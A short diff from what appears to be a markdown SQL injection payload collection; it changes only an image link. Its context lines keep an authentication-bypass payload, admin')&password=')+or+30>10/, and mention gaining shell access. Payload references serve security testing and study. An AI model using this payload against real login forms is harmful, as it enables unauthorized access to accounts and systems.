@@ -20,4 +20,4 @@ Execute it and successfully gain shell access, as you can see in the screenshot.
 ```sql
 admin')&password=')+or+30>10/
 ```
-[img](/assets/sqli_auth_bypass.jpg)
+![img](/SQL-Payloads/assets/sqli_auth_bypass.jpg)
